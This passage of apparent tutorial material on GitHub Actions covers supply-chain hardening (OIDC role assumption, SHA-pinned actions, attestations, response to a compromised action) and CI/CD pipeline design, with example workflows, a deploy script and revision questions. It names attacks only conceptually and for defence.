      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
          "token.actions.githubusercontent.com:sub": "repo:example/taskflow-api:environment:production"
        }
      }
    }
  ]
}

This is the trust policy of the IAM role taskflow-deploy-production, which only the production environment of one repository can assume. The account needs an IAM OIDC identity provider for token.actions.githubusercontent.com with audience sts.amazonaws.com.

# .github/workflows/deploy-production.yml (excerpt)
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production          # sub = repo:example/taskflow-api:environment:production
    permissions:
      contents: read
      id-token: write                # allow this job to request an OIDC token
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: aws-actions/configure-aws-credentials@e1253824e5c10ff9df46874f81ed3ec929e19cfd # v6.3.0
        with:
          role-to-assume: arn:aws:iam::123456789012:role/taskflow-deploy-production
          aws-region: us-east-1
      - run: aws sts get-caller-identity   # prints the assumed role, proving no static keys
      - env:
          IMAGE: ${{ vars.IMAGE_REPOSITORY }}@${{ inputs.digest }}
        run: ./scripts/deploy.sh production "$IMAGE"

No AWS secret exists in GitHub. The temporary credentials expire after the session duration (one hour by default), and the role's permission policy should allow only what the deploy needs.

docs.title: Build, SBOM, provenance, and verification
docs.text:
# .github/workflows/publish-image.yml (excerpt)
jobs:
  publish:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write                # push to ghcr.io
      id-token: write                # sign the attestation (Sigstore)
      attestations: write            # store the attestation
      artifact-metadata: write       # storage record for the attestation
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: docker/setup-buildx-action@f87e5991a6d7451dcb8d9637bfbc97413f497069 # v4.4.1
      - uses: docker/login-action@8aa5831fb8d48d8f76594c7ddde61ae58019f550 # v4.8.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      - id: push
        uses: docker/build-push-action@c3c9e263c25d99ce0380d002d59b67737d91b0dc # v7.4.0
        with:
          context: .
          push: true
          tags: ghcr.io/example/taskflow-api:sha-${{ github.sha }}
          sbom: true                 # BuildKit SBOM attached to the image
          provenance: mode=max       # BuildKit provenance attached to the image
      - uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2
        with:
          subject-name: ghcr.io/example/taskflow-api
          subject-digest: ${{ steps.push.outputs.digest }}
          push-to-registry: true

# Before deploying (or in an admission controller), verify where the image came from
gh attestation verify oci://ghcr.io/example/taskflow-api@sha256:<digest> \
  --owner example

# Lockfile-based SBOM for the release assets
npm sbom --sbom-format cyclonedx > taskflow-api.cdx.json

Verification fails for an image built anywhere other than this organization's workflows, so a pushed or swapped image cannot be deployed silently. Without push-to-registry, attestations are still stored by GitHub and can be verified the same way.

docs.title: Respond to a compromised dependency or action
docs.text:
# 1. Find workflows that used the compromised action
gh search code "tj-actions/changed-files" --owner example --extension yml

# 2. Find runs in the exposure window and check their logs for leaked values
gh run list --repo example/taskflow-api --created 2025-03-12..2025-03-15 --limit 200

# 3. Rotate every secret those workflows could read (tokens, keys, npm tokens)
# 4. Pin the action to a reviewed SHA or replace it with a few lines of shell

Rotation comes first: once a secret may have been printed or exfiltrated, it must be treated as compromised regardless of what the logs show.

docs.title: Best practices
docs.text:
• Default GITHUB_TOKEN to read-only and grant scopes per job.
  • Never run PR code from forks with secrets or write tokens; avoid pull_request_target with PR checkouts entirely.
  • Pass untrusted input through env:; lint workflows with zizmor or actionlint in CI.
  • Pin actions to full SHAs, enforce it by policy, and update through Dependabot.
  • Install with lockfiles and npm ci, verify registry signatures, run dependency review on PRs, and use a cooldown for new versions.
  • Use OIDC for cloud access with trust policies bound to repository and environment; keep remaining secrets in protected environments.
  • Generate SBOMs and provenance for every production artifact, and verify provenance before deploying.
  • Enable secret scanning and push protection; scan before commit too.
  • Use ephemeral runners for anything that might run untrusted code, and avoid caches in privileged workflows.
  • Have a playbook: which secrets each workflow can reach, and how to rotate them quickly.

docs.title: In production
docs.text:
• A security advisory says an action you use was compromised. Detect: advisory or alert; gh search code finds the action in your workflows. Cause: a tag-referenced action was repointed to malicious code. Fix: rotate every secret those workflows could access, review run logs in the exposure window, pin to a verified SHA or remove the action, and enforce SHA pinning by policy.
  • A fork PR's workflow pushed a commit to main. Detect: an unexpected commit authored by the Actions bot; the run was a pull_request_target event. Cause: a pwn request: the workflow checked out and executed PR code with a write token. Fix: revert, rotate secrets, switch to pull_request for untrusted code, and split privileged follow-up work into a workflow_run workflow that treats PR output as data.
  • A PR titled with shell syntax ran commands in CI. Detect: unexpected network calls or output in a run triggered by an issue or PR event. Cause: ${{ github.event.*.title }} interpolated into run:. Fix: move untrusted values into env:, add zizmor to CI, and audit other workflows for the same pattern.
  • An old AWS access key from CI appears in an attacker's activity. Detect: CloudTrail shows API calls from unknown IPs with a key used by GitHub Actions. Cause: a long-lived key stored as a secret and leaked from logs, a dependency, or a former employee's copy. Fix: deactivate the key, investigate, and replace it with OIDC role assumption bound to repository and environment.
  • Staging deployed an image nobody built in CI. Detect: gh attestation verify fails for the running digest, or there is no CI run producing it. Cause: someone pushed an image from a laptop with registry write access. Fix: remove human push rights, require attestation verification before deploy, and deploy only digests produced by the release workflow.
  • A malicious package version was installed within hours of release. Detect: dependency alerts or unusual install-time network activity. Cause: automatic upgrades with no delay and no review. Fix: pin through lockfiles, use Dependabot's cooldown, review dependency diffs with dependency review, and rotate anything the install could reach.

docs.title: Important terminology
docs.text:
• Supply chain attack: Compromising software through its dependencies, tools, or build process rather than directly.
  • Least privilege: Granting only the permissions a task needs.
  • Pwn request: Running untrusted PR code in a privileged pull_request_target context.
  • Script injection: Untrusted input interpreted as code because it was interpolated into a script.
  • SHA pinning: Referencing an action by full commit SHA instead of a movable tag.
  • Dependency review: A PR check that reports vulnerable or disallowed dependency changes.
  • Dependency confusion: Installing a public package that impersonates an internal package name.
  • OIDC federation: Exchanging a short-lived identity token for cloud credentials without stored keys.
  • Trust policy: The cloud-side rule deciding which token claims may assume a role.
  • SBOM: A machine-readable list of an artifact's components.
  • Provenance: A signed record of how and where an artifact was built.
  • Attestation: A signed statement about an artifact, such as its provenance or SBOM.
  • SLSA: A framework of supply chain security levels for builds.
  • Push protection: Blocking pushes that contain detected secrets.

docs.title: Common mistakes and misconceptions
docs.text:
• Believing secret masking prevents exfiltration.
  • Using pull_request_target to "fix" missing secrets on fork PRs.
  • Pinning actions to tags and calling it pinned.
  • Granting write-all because one step needed a write scope.
  • Trusting a wildcard OIDC subject such as repo:example/* for production roles.
  • Generating SBOMs and attestations but never verifying or using them.
  • Running fork PRs on persistent self-hosted runners.
  • Rotating secrets only after confirming misuse, instead of immediately.

docs.title: Revision questions
docs.text:
1. Why do fork PRs not receive secrets, and why is switching to pull_request_target the wrong fix?
  2. Show a vulnerable run: step with script injection and rewrite it safely.
  3. Why does pinning to a full commit SHA protect against the tj-actions/changed-files style of attack, and what does it not protect against?
  4. Walk through the OIDC exchange between a GitHub Actions job and AWS, naming the claims the trust policy checks.
  5. A role trusts repo:example/taskflow-api:ref:refs/heads/*. What can go wrong, and what subject would you use for production deploys?
  6. What does each SLSA Build level from L1 to L3 add, and which level do GitHub artifact attestations reach on their own?
  7. A workflow has 6 jobs; only one publishes to GHCR and one deploys with OIDC. With permissions: write-all at the top, how many jobs hold write tokens they do not need, and what should the permissions look like? (Four or more; contents: read at the top, packages: write on the publish job, id-token: write on the deploy job.)
  8. What should happen, in order, when a dependency used in CI is reported compromised?

docs.title: Pipeline Design
docs.text:
A CI/CD pipeline is a program that turns a commit into a tested, deployable artifact and moves it through environments. Like any program, it can be well or badly designed: the same checks can take 8 minutes or 45, cost a little or a lot, and produce trustworthy or misleading results depending on how jobs are arranged, cached, and connected.

This lesson covers stages and job graphs, fail-fast ordering, parallelism and matrix builds, lockfile-keyed dependency caching, passing artifacts between jobs, building once and deploying many times, deterministic builds, path filters for monorepos, pipeline speed budgets, and idempotent deploy steps.

docs.title: Why it matters
docs.text: Pipeline speed and reliability directly shape how a team works. A slow pipeline makes developers batch changes and context-switch; a flaky one teaches them to ignore red; a pipeline that rebuilds per environment ships bits that were never tested; and a deploy step that is not idempotent turns every retry into a gamble. Because the pipeline runs for every push of every developer, small design choices multiply: shaving 3 minutes off a pipeline that runs 200 times a day saves 10 hours of waiting daily.

docs.title: Real-world usage
docs.text:
• Twelve-Factor apps. The Build, release, run factor requires strictly separating the build stage (turning code into an executable bundle) from the release stage (combining that build with an environment's config), with every release getting a unique ID and never being changed. That is "build once, deploy many" stated as a principle.
  • Google. The CI chapter of Software Engineering at Google explains how Google's continuous build uses the dependency graph to run only the tests downstream of a change, batches changes when there are too many to test individually, and splits fast presubmit checks from slower post-submit ones.
  • GitHub Actions caching. GitHub's dependency caching reference documents lockfile-hash keys with hashFiles, prefix-matching restore-keys, branch scoping, immutable cache entries, a default 10 GB per-repository limit, and eviction of caches unused for 7 days.
  • Reproducible builds. The Reproducible Builds project defines a build as reproducible when identical source, environment, and instructions produce bit-for-bit identical artifacts, which lets anyone verify that a binary came from the claimed source.

Popular tools and providers: GitHub Actions, GitLab CI/CD (stages and needs), CircleCI workflows, Buildkite pipelines, Jenkins pipelines, and build systems with remote caching such as Bazel, Nx, and Turborepo.

docs.title: Stages and job graphs
docs.text:
Older pipelines run in stages: every job in stage 1, then every job in stage 2, and so on. Modern systems describe a directed acyclic graph (DAG) of jobs: each job declares the jobs it needs (needs: in GitHub Actions and GitLab), and anything without a dependency starts immediately. Jobs on separate runners run in parallel.

The pipeline's wall-clock time is the length of its critical path, the longest chain of dependent jobs. In the example, making lint faster saves nothing; making integration or end-to-end tests faster saves time directly. Every job also has fixed overhead (runner start, checkout, dependency install, typically 20-60 seconds), so splitting work into too many tiny jobs can make a pipeline slower.

docs.title: Fail-fast ordering
docs.text:
Run the cheapest checks that catch the most common failures first, and stop spending compute once a run is doomed:

Order Check Why here 1 Formatting, lint, type check Seconds; catch the most frequent mistakes 2 Unit tests Fast and deterministic 3 Integration tests with service containers Slower; need a database 4 Build and package Only worth it if the code is correct 5 Deploy to staging, end-to-end tests Slowest and most expensive 6 Production deploy Only for verified artifacts

Fail-fast has two layers. Ordering decides what runs first; parallel jobs that are independent can still run side by side. In a matrix, strategy.fail-fast: true (the default in GitHub Actions) cancels the other matrix jobs when one fails, which saves compute but hides whether other combinations would also have failed; set it to false when you need the full picture.

docs.title: Parallelism and matrix builds
docs.text:
A matrix runs the same job over combinations of variables:

strategy:
  matrix:
    node: [22, 24, 26]
    os: [ubuntu-latest, windows-latest]

This creates 6 jobs. Use matrices where the variation is real: a library that supports several Node.js versions and operating systems. For an application deployed on one runtime (TaskFlow API runs Node.js 24 in a Linux container), test that one combination; a matrix adds cost without adding confidence. The other common use is test sharding: splitting one slow suite across N parallel jobs (see testing and quality gates).

docs.title: Dependency caching
docs.text:
Installing dependencies from the network is often the slowest part of a short job. A cache stores files between runs under a key; the right key changes exactly when the cached content should change. For npm that is the lockfile:

key:          Linux-npm-<sha256 of package-lock.json>
restore-keys: Linux-npm-

Rules that keep caching correct:

  • Cache the package manager's download cache (~/.npm), not node_modules. npm ci deletes node_modules anyway, and caching it across Node.js versions or operating systems causes subtle breakage. actions/setup-node with cache: npm does this for you.
  • Key on everything that changes the content: OS, runtime version if native modules are built, and the lockfile hash.
  • Caches are immutable: an existing key is never overwritten, which is why the key must change with the content.
  • Caches are a speed-up, never a correctness requirement. A cold run must produce the same result.
  • Scope matters. Branch runs can read caches from their own branch and the default branch; pull requests can also read their base branch's. Untrusted workflows writing caches that privileged workflows later read is a known poisoning risk (see pipeline and supply chain security).

Container builds cache layers instead. With Docker Buildx in GitHub Actions, cache-from: type=gha and cache-to: type=gha,mode=max store layers in the Actions cache, so an unchanged npm ci layer is reused (see writing production Dockerfiles).

docs.title: Artifacts between jobs
docs.text:
Jobs run on fresh machines and share nothing by default. Two mechanisms move files between them, and they are often confused:

Cache Artifact Purpose Speed up repeated work (dependencies) Pass outputs of this run to later jobs, or keep them for people Lifetime Until evicted (unused 7 days, size limit) Retention period (90 days by default, configurable) Guaranteed present No Yes, within the run Typical contents ~/.npm, build tool caches Built bundles, test reports, coverage, SBOMs Actions actions/cache, setup-* caching actions/upload-artifact, actions/download-artifact

Container images are not passed as workflow artifacts; the build job pushes them to a registry and passes the digest to later jobs as a job output (shown below).

docs.title: Build once, deploy many
docs.text:
Build the deployable artifact exactly once, from one commit, and deploy that same artifact to every environment. Environment differences belong in configuration injected at deploy time, never in separate builds.

Rebuilding for each environment means the production artifact was never tested: a dependency release between builds, a different base image, or a build flag can change it. Promotion by digest, approvals, and deployment records are covered in artifacts and environment promotion.

docs.title: Deterministic builds
docs.text:
A build is deterministic when the same inputs always produce the same output. Sources of nondeterminism and their fixes:

Source Fix Floating dependency versions Commit the lockfile; install with npm ci Floating base images (node:24) Pin by digest (node:24-slim@sha256:...), updated by Dependabot Floating tool versions (runner images, CLIs) Pin action versions and tool versions explicitly Network fetches during the build Fetch everything in an install step; fail if the network is needed later Timestamps and build paths embedded in output Use SOURCE_DATE_EPOCH, avoid embedding absolute paths Tests depending on time, randomness, or order Fixed seeds, fake clocks, isolated test data

Full bit-for-bit reproducibility is hard; the practical goal is that rebuilding the same commit gives functionally identical artifacts, and that you never need to, because you keep the original.

docs.title: Monorepo path filters
docs.text:
In a monorepo, running every pipeline on every change wastes time. Workflows can trigger only when relevant paths change:

on:
  pull_request:
    paths:
      - "apps/api/**"
      - "packages/shared/**"
      - ".github/workflows/api.yml"

The catch: a workflow skipped by a path filter never reports its checks, so a required check stays pending and blocks the PR. Two common solutions are to keep workflow-level filters only on non-required workflows, or to run the workflow always and decide inside it, with a small job that computes what changed and conditional jobs (a job skipped by if: reports success). Build tools such as Nx and Turborepo can also compute "affected" projects from the dependency graph.

docs.title: Pipeline speed budgets
docs.text:
Treat pipeline time as a budget with an owner, like page-load time:

Segment Budget (typical target) Pull request checks 10 minutes or less Merge to deployed in staging 20 minutes or less Staging to production (excluding approval wait) 15 minutes or less Checkout and dependency install per job Under 1 minute with caching Flaky failure rate Well under 1% of runs

Measure the critical path and its trend (gh run view <id> --json jobs gives each job's start and end time), alert on regressions, and spend effort on the jobs that sit on the critical path.

docs.title: Idempotent deploy steps
docs.text:
An idempotent step produces the same end state no matter how many times it runs. Deploy steps must be idempotent because pipelines retry: a runner dies, a network call times out, someone clicks "re-run".

  • Declare desired state instead of issuing changes: kubectl apply, terraform apply, or "set the image to this digest" are safe to repeat; "add one replica" or "append this line" are not.
  • Use immutable inputs: deploy a digest, not latest.
  • Make migrations tracked: migration tools record applied migrations, so re-running applies nothing new.
  • Serialize deploys per environment with a concurrency group, so two runs never deploy to the same environment at once.
  • Verify after acting: wait for the rollout to become healthy, and fail the step if it does not.

docs.title: When to use and when not to use
docs.text: Technique Use when Avoid or adapt when Job DAG with parallel jobs Independent checks that each take more than a minute Tiny checks where per-job overhead dominates; group them in one job Matrix builds Libraries and tools supporting several runtimes or platforms Applications deployed on one runtime Test sharding A single suite longer than a few minutes Suites with heavy shared setup per shard Dependency cache Almost always Workflows with elevated privileges where cache poisoning is a concern; disable or isolate Workflow artifacts Passing files between jobs, keeping reports Container images (use a registry) Path filters Monorepos with independent projects Required checks (use in-workflow change detection instead) Post-merge-only suites Slow, less reliable suites Checks that must block merging (security, unit tests)

docs.title: A pipeline skeleton as a job graph
docs.text:
# .github/workflows/pipeline.yml (structure; full steps on the next pages)
name: pipeline
on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:             { runs-on: ubuntu-latest, steps: [ ... ] }
  unit:             { runs-on: ubuntu-latest, steps: [ ... ] }
  integration:      { runs-on: ubuntu-latest, services: { ... }, steps: [ ... ] }
  audit:            { runs-on: ubuntu-latest, steps: [ ... ] }

  ci-ok:                                   # the single required check
    if: always()
    needs: [lint, unit, integration, audit]
    runs-on: ubuntu-latest
    steps:
      - name: Fail if any needed job failed or was cancelled
        if: contains(needs.*.result, 'failure') || contains(needs.*.result, 'cancelled')
        run: exit 1

  build:
    needs: ci-ok
    if: github.event_name == 'push'        # only main builds a deployable image
    runs-on: ubuntu-latest
    permissions: { contents: read, packages: write }
    outputs:
      digest: ${{ steps.push.outputs.digest }}
    steps: [ ... ]                         # step id "push" builds and pushes the image

  deploy-staging:
    needs: build
    environment: staging
    concurrency: { group: deploy-staging, cancel-in-progress: false }
    runs-on: ubuntu-latest
    steps: [ ... ]                         # deploys needs.build.outputs.digest

  e2e:
    needs: deploy-staging
    runs-on: ubuntu-latest
    steps: [ ... ]

  deploy-production:
    needs: [build, e2e]
    environment: production                # required reviewers approve here
    concurrency: { group: deploy-production, cancel-in-progress: false }
    runs-on: ubuntu-latest
    steps: [ ... ]                         # deploys the same digest

The ci-ok job exists because of a subtle rule: if a job fails, the jobs that need it are skipped, and a skipped job counts as passing for required checks. Requiring only build would therefore let a PR with failing tests merge. An aggregator job with if: always() that fails when any dependency failed gives branch protection one reliable check to require. Complete versions of these jobs are in GitHub Actions in depth and artifacts and environment promotion.

docs.title: A matrix for a shared npm package
docs.text:
# .github/workflows/sdk.yml (taskflow-sdk supports several Node.js versions)
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false          # show every failing combination
      max-parallel: 4
      matrix:
        node: [22, 24, 26]
        os: [ubuntu-latest, windows-latest]
        exclude:
          - node: 22
            os: windows-latest
        include:
          - node: 24
            os: macos-latest
    steps:
      - uses: actions/checkout@v7
      - uses: actions/setup-node@v7
        with:
          node-version: ${{ matrix.node }}
          cache: npm
      - run: npm ci
      - run: npm test

Three Node.js versions times two operating systems is 6 combinations; the exclude removes one and the include adds a macOS job, so 6 jobs run, at most 4 at a time.

docs.title: Explicit lockfile-keyed caching and Docker layer caching
docs.text:
# .github/workflows/build.yml (excerpt)
steps:
  - uses: actions/checkout@v7
  - uses: actions/setup-node@v7
    with:
      node-version-file: .nvmrc
  - uses: actions/cache@v6
    with:
      path: ~/.npm
      key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
      restore-keys: |
        ${{ runner.os }}-npm-
  - run: npm ci

  - uses: docker/setup-buildx-action@v4
  - uses: docker/build-push-action@v7
    with:
      context: .
      push: false
      tags: taskflow-api:ci
      cache-from: type=gha
      cache-to: type=gha,mode=max

setup-node's cache: npm input does the same as the explicit actions/cache step; the explicit form shows how keys work and lets you cache other tools. mode=max also caches intermediate layers of multi-stage builds.

docs.title: Change detection that works with required checks
docs.text:
# .github/workflows/monorepo-ci.yml (excerpt)
on:
  pull_request:

jobs:
  changes:
    runs-on: ubuntu-latest
    outputs:
      api: ${{ steps.diff.outputs.api }}
      web: ${{ steps.diff.outputs.web }}
    steps:
      - uses: actions/checkout@v7
        with:
          fetch-depth: 0
      - id: diff
        env:
          BASE_SHA: ${{ github.event.pull_request.base.sha }}
        run: |
          changed=$(git diff --name-only "$BASE_SHA" HEAD)
          echo "api=$(grep -qE '^(apps/api/|packages/shared/)' <<<"$changed" && echo true || echo false)" >> "$GITHUB_OUTPUT"
          echo "web=$(grep -qE '^(apps/web/|packages/shared/)' <<<"$changed" && echo true || echo false)" >> "$GITHUB_OUTPUT"

  api-test:
    needs: changes
    if: needs.changes.outputs.api == 'true'   # skipped job reports success
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: npm ci && npm test --workspace apps/api

The workflow always runs, so its checks always report. When the API did not change, api-test is skipped and counts as passing; when it did, the tests must pass.

docs.title: An idempotent deploy step
docs.text:
#!/usr/bin/env bash
# scripts/deploy.sh: deploy one image digest to one environment; safe to re-run
set -euo pipefail

ENVIRONMENT="$1"                 # staging | production
IMAGE="$2"                       # ghcr.io/example/taskflow-api@sha256:...

# Desired state: the Deployment runs exactly this image. Re-running is a no-op.
kubectl --context "$ENVIRONMENT" -n taskflow \
  set image deployment/taskflow-api api="$IMAGE"

# Verify: wait for the rollout to finish, fail the job if it does not.
kubectl --context "$ENVIRONMENT" -n taskflow \
  rollout status deployment/taskflow-api --timeout=5m

Setting the image to the digest it already runs changes nothing, so a retried job is harmless, and rollout status makes the step fail when the new version never becomes healthy. Kubernetes rollouts are covered in health probes and rolling updates.

docs.title: Finding the critical path of a slow run
docs.text:
gh run list --workflow pipeline.yml --branch main --limit 1 --json databaseId --jq '.[0].databaseId'
# 13579
gh run view 13579 --json jobs \
  --jq '.jobs[] | [.name, .startedAt, .completedAt, .conclusion] | @tsv'

Sort the jobs by start time and follow the needs chain with the latest finishing times; that chain is where optimization pays.

docs.title: Best practices
docs.text:
• Model the pipeline as a job graph; parallelize independent checks and keep the critical path short.
  • Order checks cheapest-first and fail fast, but keep per-job overhead in mind.
  • Use matrices only where the variation is real, and sharding for long suites.
  • Key caches on the lockfile hash (plus OS and runtime), cache download directories rather than node_modules, and make cold runs correct.
  • Pass files with artifacts and images with registry digests, not caches.
  • Build once per commit and promote the same artifact; inject configuration at deploy time.
  • Pin dependencies, base images, and actions so builds are deterministic.
  • Give branch protection one aggregate required check that cannot be skipped into a pass.
  • Write deploy steps as idempotent desired-state operations, serialized per environment.
  • Set and track pipeline speed budgets.

docs.title: In production
docs.text:
• A PR with failing tests was merged. Detect: main fails right after the merge; the PR's required check shows "skipped" or "success" while tests failed. Cause: the required check was a job that needs the test job, so it was skipped when tests failed, and skipped counts as success. Fix: require an aggregator job with if: always() that fails on any failed or cancelled dependency, or require the test jobs themselves.
  • Builds fail at random after a dependency cache was introduced. Detect: failures disappear when the cache is deleted (Actions caches page or gh cache delete --all). Cause: caching node_modules across Node.js versions or OSes, or a key that does not include the lockfile hash. Fix: cache ~/.npm keyed on OS and lockfile hash, and always run npm ci.
  • Production runs code that differs from what staging tested. Detect: the image digest in production differs from staging's for the same version. Cause: each environment's job rebuilt the image. Fix: build once, pass the digest as a job output, and deploy by digest everywhere.
  • A monorepo PR is blocked forever on a pending check. Detect: the check shows "Expected: waiting for status"; the workflow has a paths filter. Cause: the workflow was skipped, so its required check never reported. Fix: run the workflow always and use in-job change detection with conditional jobs.
  • A re-run deploy left two versions half-rolled-out. Detect: overlapping deploy runs in the Actions history; mixed pod versions. Cause: non-idempotent steps and no concurrency control. Fix: desired-state deploys by digest, a concurrency group per environment with cancel-in-progress: false, and rollout verification.
  • The pipeline crept from 9 to 26 minutes over six months. Detect: trend of run duration per workflow. Cause: new jobs added to the critical path, a slow integration suite, lost caching. Fix: set a budget with an owner, parallelize or shard the critical path, and restore caching.

docs.title: Important terminology
docs.text:
• Stage: A group of jobs that runs before the next group starts.
  • Job DAG: Jobs connected by declared dependencies (needs).
  • Critical path: The longest chain of dependent jobs; it sets the pipeline's duration.
  • Fail fast: Running cheap, likely-to-fail checks first and stopping early.
  • Matrix build: One job definition run over combinations of variables.
  • Sharding: Splitting one test suite across parallel jobs.
  • Cache key: The identifier deciding which cached files to restore.
  • Restore keys: Fallback key prefixes used when no exact match exists.
  • Artifact (workflow): Files uploaded by a job for later jobs or people.
  • Build once, deploy many: Promoting one built artifact through all environments.
  • Deterministic build: Same inputs, same outputs.
  • Path filter: A trigger condition based on changed file paths.
  • Idempotent step: A step whose repeated execution yields the same end state.

docs.title: Common mistakes and misconceptions
docs.text:
• Splitting every check into its own job, so runner overhead dominates.
  • Using a matrix for an application that runs on one runtime.
  • Caching node_modules or using a cache key without the lockfile hash.
  • Treating caches as artifacts, or depending on a cache being present.
  • Rebuilding the image for staging and production.
  • Requiring a check that can be skipped into a pass.
  • Path filters on workflows that provide required checks.
  • Deploy scripts that "add" or "increment" instead of declaring state.
  • Optimizing jobs that are not on the critical path.

docs.title: Revision questions
docs.text:
1. What is a pipeline's critical path, and why does speeding up a job off it not help?
  2. Order these checks for fail-fast: end-to-end tests, lint, build image, unit tests, integration tests. Justify the order.
  3. A matrix has node: [22, 24, 26], os: [ubuntu-latest, windows-latest, macos-latest], one exclude entry, and two include entries that add new combinations. How many jobs run? (3 x 3 - 1 + 2 = 10.)
  4. Why is the lockfile hash the right cache key for npm, and why cache ~/.npm rather than node_modules?
  5. Explain the difference between a cache and an artifact, with one example of each.
  6. Why must a pipeline build once and deploy many, and where do environment differences go?
  7. Why can a required check that needs the test job let a failing PR merge, and how do you fix it?
  8. What makes a deploy step idempotent? Rewrite "scale up by one replica" as an idempotent operation.
